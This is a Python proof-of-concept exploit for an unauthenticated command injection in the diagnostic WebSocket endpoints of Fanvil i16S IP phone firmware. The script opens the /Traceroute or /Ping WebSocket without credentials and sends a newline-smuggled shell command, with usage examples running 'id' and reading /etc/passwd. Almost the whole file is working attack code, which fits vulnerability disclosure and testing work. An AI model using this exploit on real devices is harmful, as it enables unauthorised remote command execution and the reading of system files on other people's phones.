#!/usr/bin/env python3
"""
Fanvil i16S firmware V0.2.2-2.12.19 - unauthenticated OS command injection in the
diagnostic WebSocket endpoints /Traceroute and /Ping (CWE-78, CVE-TBD).

The WebSocket upgrade is accepted without any cookie or credential. The first text
frame is used as the diagnostic target, validated by uStrIsValidIPOrDomain() (which
accepts a newline) and executed through popen("traceroute %s "). The newline ends the
intended command and the remainder is executed by /bin/sh.

Usage:
  python3 poc.py --host <host> --cmd id
  python3 poc.py --host <host> --path /Ping --cmd "id; uname -a"
  python3 poc.py --host <host> --target 127.0.0.1 --cmd "cat /etc/passwd"

This is a non-destructive proof of concept: it only executes the supplied command and
prints the output that the device returns over the same WebSocket.
"""
import argparse, base64, os, socket, struct, sys, time


def ws_handshake(host, port, path, timeout):
    """Open the WebSocket without any authentication material."""
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET %s HTTP/1.1\r\n"
           "Host: %s:%d\r\n"
           "Upgrade: websocket\r\n"
           "Connection: Upgrade\r\n"
           "Sec-WebSocket-Key: %s\r\n"
           "Sec-WebSocket-Version: 13\r\n"
           "\r\n" % (path, host, port, key))
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = s.recv(4096)
        if not chunk:
            raise RuntimeError("connection closed during handshake")
        data += chunk
    head, _, rest = data.partition(b"\r\n\r\n")
    return s, head.decode("latin1"), rest


def send_text(sock, payload):
    """Send one masked WebSocket text frame."""
    data = payload.encode() if isinstance(payload, str) else payload
    mask = os.urandom(4)
    header = bytearray([0x81])
    n = len(data)
    if n < 126:
        header.append(0x80 | n)
    elif n < 65536:
        header.append(0x80 | 126)
        header += struct.pack(">H", n)
    else:
        header.append(0x80 | 127)
        header += struct.pack(">Q", n)
    header += mask
    sock.sendall(bytes(header) + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))


def read_frames(sock, idle_timeout=6.0, max_time=30.0):
    """Yield text payloads from unmasked server frames."""
    out = []
    buf = b""
    start = time.time()
    while time.time() - start < max_time:
        sock.settimeout(idle_timeout)
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= 2:
            b1 = buf[1]
            length = b1 & 0x7F
            off = 2
            if length == 126:
                if len(buf) < 4:
                    break
                length = struct.unpack(">H", buf[2:4])[0]
                off = 4
            elif length == 127:
                if len(buf) < 10:
                    break
                length = struct.unpack(">Q", buf[2:10])[0]
                off = 10
            if b1 & 0x80:
                off += 4
            if len(buf) < off + length:
                break
            payload = buf[off:off + length]
            buf = buf[off + length:]
            out.append(payload.split(b"\x00")[0].decode("latin1", "replace"))
    return out


def main():
    ap = argparse.ArgumentParser(description="Fanvil i16S unauthenticated diagnostic WebSocket command injection")
    ap.add_argument("--host", required=True, help="device address")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/Traceroute", choices=["/Traceroute", "/Ping"])
    ap.add_argument("--target", default="127.0.0.1", help="value placed before the newline")
    ap.add_argument("--cmd", default="id", help="command executed after the newline")
    ap.add_argument("--timeout", type=float, default=8.0)
    args = ap.parse_args()

    frame = args.target + "\n" + args.cmd
    sock, head, rest = ws_handshake(args.host, args.port, args.path, args.timeout)
    print("[+] handshake:")
    for line in head.split("\r\n"):
        print("    " + line)
    if "101" not in head.split("\r\n")[0]:
        print("[-] server did not upgrade; not vulnerable or endpoint unavailable")
        return 1
    print("[+] WebSocket upgraded without authentication")
    send_text(sock, frame)
    print("[+] sent text frame: %r" % frame)
    lines = read_frames(sock)
    try:
        sock.close()
    except OSError:
        pass
    print("[+] server output:")
    for line in lines:
        print("    " + line)
    return 0


if __name__ == "__main__":
    sys.exit(main())
